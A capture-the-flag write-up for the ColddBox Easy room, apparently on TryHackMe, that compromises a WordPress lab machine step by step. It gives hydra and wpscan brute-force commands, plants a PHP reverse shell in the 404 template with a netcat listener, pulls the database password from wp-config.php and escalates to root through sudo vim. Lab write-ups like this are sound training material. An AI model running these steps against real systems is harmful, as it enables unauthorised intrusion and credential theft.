## Setup

```commandline
$ export IP_HOST=10.8.208.30
$ export IP_TARGET=10.10.86.15
$ export WRITEUP="$HOME/Documents/THM/colddboxeasy/"
$ mkdir -p $WRITEUP
$ cd $WRITEUP
$ tmux
```

## Tools Used

- `nmap`
- `gobuster`
- `wpscan`
- `Burp Suite`
- `hydra`

## Enumeration of ports and services

As most of the time, `nmap` to enumerate the port. My first scan, without scanning all ports (`-p-`) only popped up the port `80`. Was very septic, so I ran a second scan on all ports which revealed OpenSSH running on the unusual port, `4512`.

We have found 4 usernames with the `wpscan`. 3 of them we already have. So let's save this new one too.

````commandline
echo "****" >> usernames.txt
````

## Looking at the website

Nothing fancy to see there. Also nothing to find in the HTML source code.

![alt text](files/webserver_01.png "Webserver")

Looking at the source code of that home page, nothing suspect found. There's only one post and one comment. Looks like we found maybe another username. On this page also nothing found in the source code.

![alt text](files/webserver_02.png "Webserver")

Saving this new username:

````commandline
echo "****" >> usernames.txt
````

## Brute forcing with hydra

Brute forcing with `hydra`. For this, we first need to make use of `Burp Suite` to intercept the login form and to know how we can pass our information to `hydra`.

![alt text](files/burp_01.png "Webserver")

What is in our interest is the: `log=testuser&pwd=testpass&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1`

And the error message displayed after a bad login: `ERROR: Invalid username. Lost your password?`

![alt text](files/webserver_03.png "Webserver")

We have a file with all our potential usernames we found so far. So let's bruteforce on all the different usernames.

````commandline
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $IP_TARGET http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:'ERROR: Invalid username. Lost your password?'" -V
````

This took ages for some reasons I do not know. 16 attempts per minutes. This go lasts forever at this speed! I'm not planning to cross my arms and wait a few hours until this finish. Like this is a `WordPress` site, it's maybe more practical to make use of the build in brute force of `wpscan`. So I cancelled this `hydra` bruteforce attack.

## Brute forcing with WPScan

same principe, as we have a list of potential usernames, let's make use of it.

````commandline
wpscan --url http://$IP_TARGET -U usernames.txt -P /usr/share/wordlists/rockyou.txt
````

After something like 15 minutes, `wpscan` found the password for user *****. So I stopped this brute force attack as this is a CTF and most of the time, this is about one low privilege user account we need to attack. Can run it again later if needed.

## Installing a reverse shell in WordPress

Once logged in, we can make use of the `WordPress` fancy `404 Template` features which allows embedding PHP code. `WordPress` is so insecure by allowing this by default. So this is easy, we can make use of this to embed our `PHP` web shell in that template.

For this in `Appearance` > `Editor`. Then click on the `404 templates`.

![alt text](files/wordpress_01.png "WordPress")

On the right side, we see the different templates we can modify. Okay, in this screenshot, I already had clicked on it and it already loaded. You see that with the content of the big input field and the label of it.

![alt text](files/wordpress_02.png "WordPress")

We can make use of the `/usr/share/webshells/php/php-reverse-shell.php` which is available by default on `Kali`. But we need to be careful. Do not copy the whole content of that `php-reverse-shell.php` file and paste that like is in between the existing `PHP` code of that `404.php` template file. We need to mind the opening `PHP` tag. 

The easiest way is to copy the whole content of the `php-reverse-shell.php` and pasting it before the first line of that `404.php` file. Then I add plenty of new lines after that to separate both contents, in case if I need to clean that up later. Also, an important point, is to adjust the IP and port to match our host computer. Finally, press the `Update File` button.

Now we need to set a listener on our host machine.

````commandline
nc -lnvp 4444
````

Now we can point our browser to some random non-existent page on the `WordPress` site and our reverse shell will execute and connect to the host machine. Something like <http://10.10.86.15/?p=9999>. Not <http://10.10.86.15/random< as this will trigger the `Apache 404` and not the `WordPress` one.

## Horizontal privilege escalating

We are now connected!

`Python` is not installed on the target machine, using `python3` then to stabilise the shell. Wanted to grab the `user.txt` flag. But no luck, it's only readable by user `*****`. Tried also to switch to user `*****`, but he does not use the same password as on the `WordPress` website.

As the password for user `*****` on `WordPress` is not that same as his system password. We need to find another way. Usually, glitches happens when user reuse their passwords. This user did not reuse his `WordPress` password for his system account. But maybe we can find something else in the configuration files of the `WordPress` website.

````commandline
www-data@ColddBox-Easy:/var/www/html$ ls
hidden           wp-blog-header.php    wp-includes        wp-signup.php
index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
license.txt      wp-config-sample.php  wp-load.php        xmlrpc.php
readme.html      wp-config.php         wp-login.php
wp-activate.php  wp-content            wp-mail.php
wp-admin         wp-cron.php           wp-settings.php
````

And looking in the `wp-config.php`, we can see the database password.

````commandline
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php | grep DB_PASSWORD
define('DB_PASSWORD', '*************');
````

And with this password, we can finally log in with user `*****`.

````commandline
www-data@ColddBox-Easy:/var/www/html$ su *****
Password: 
*****@ColddBox-Easy:/var/www/html$ cd /home/c0ldd/
*****@ColddBox-Easy:~$ cat user.txt

## Vertical privilege escalating

Looking now how we can escalate the user privileges. I first tend to look with `sudo`, as this is a classic. But shoot! This is spanish and the message confuse me so much. I don't master spanish except for ordering "2 cervesas por favor". The day after, "agua sun gaz por favor". And even then, not sure about the spelling at all.

````commandline
*****@ColddBox-Easy:~$ sudo -l
[sudo] password for *****: 
Coincidiendo entradas por defecto para ***** en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
*****@ColddBox-Easy:~$
````

So let's try!

````commandline
sudo /usr/bin/vim
````

Yes, `vim` runs and there we go!

````commandline
:!sh
# cat /root/root.txt
wq**********YWRlcywgbcOhcXVpbmEgY29t**********E=
#
````

We have other possibilities, you can read more on [GTFOBins](https://gtfobins.github.io/) and try them out.

Mission accomplished!

Hopefully you enjoyed as much as I did :-)
